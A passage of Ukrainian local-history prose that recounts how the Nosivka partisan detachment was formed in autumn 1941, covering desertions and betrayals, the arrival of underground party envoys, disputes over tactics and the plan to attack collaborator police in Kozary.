	<p>Але дійсність показала, що передбачити все в тих умовах було трудно. Вже перша група, якою повинен був командувати Омелян Хахуда, залишилася без командира. Хахуда в ліс не з'явився, а вирішив сховатися від ворога вдома. Чимало членів бойових груп, коли наблизився фронт, відступили разом з військовими частинами. Знайшлися і такі, які ціною зради надіялися заслужити помилування окупантів. Ці зрадники видали ворогу розташування лісових складів продовольства і зброї. Всі ці несподіванки не були передбачені і багато зашкодили розгортанню партизанської боротьби.</p>
<p>Ядром Носівського партизанського загону була група М. Скоро до них приєдналася група голови Червонопартизанської сільської ради Кузьми Огієнка. В цей час партизани зустріли червоноармійців-кавалеристів, які потрапили в оточення німецьких військ і вирішили продовжувати боротьбу з ворогом у партизанському загоні. Серед них були Шевирьов , Байбуров , Григор'єв.</p>
		
	<p>Коли на початку жовтня в ліс прибули члени підпільного райкому партії, група Симоненка вже нараховувала 32 бійці. Стратилат зібрав решту розпорошених по лісах груп і об'єднав усіх бійців у партизанський загін, який тепер уже мав 68 чоловік. В урочищі Орішне , де був створений Носівський партизанський загін, споруджено великий обеліск партизанської Слави.</p>
<p>Третього жовтня в розташування Носівського партизанського загону прибули посланці підпільного обкому партії. Це були М. Демченко — заввідділом обкому партії та зв'язковий обласного партизанського загону П. Вони зібрали всіх бійців партизанського загону, розповіли про становище на фронтах та проінформували про наказ підпільного обкому партії активізувати боротьбу з окупантами.</p>
<p>Виходячи із наявності на території району комунікацій, по яких забезпечувалося обслуговування німцями фронту, підпільний обком ставить завдання розпочати диверсії на цих шляхах. Адже до цього часу, зважаючи на малочисельність загону, партизани уникали відкритих сутичок з окупантами.</p>
<p>На початковому етапі боротьби основною була роз'яснювальна робота серед населення та налагодження зв'язків. Тепер було поставлено пряме завдання перейти до активної боротьби з окупантами та їх прислужниками — поліцаями. Разом з Демченком в загін прибула група партизан із Підгайного. Нею командував замість Хахуди — Бондар. Таким чином загін збільшився ще на 17 бійців. Але загальна атмосфера в загоні була досить важка. Невизначеність обстановки на фронтах пригнічували багатьох, навіть членів підпільного райкому. Наприклад, Окостень і Кононенко пропонували не розгортати бойових дій, а зберігати сили до того часу, поки регулярна армія не почне гнати ворога з нашої території, і лише тоді включити ся в боротьбу.</p>
<p>Довгопол і Серновець пропонували іти до лінії фронту і там влитися в частини Радянської Армії. Потрібні були велика сила волі Стратилата, вміння працювати з людьми, щоб переконати своїх бійців у важливості боротьби з окупантами тут, у тилу ворога. Починалася важка і боротьба з ворогом. Попереду було дуже багато боїв, з перемогами і непоправимими втратами. Але перший бій, перше бойове хрещення ніколи не забувалися. Про нього часто згадували народні месники. Маючи відомості про те, що в с. Козари раніше ніж в інших селах було організовано із німецьких запроданців поліцію, командування загону вирішує знищити її.</p>
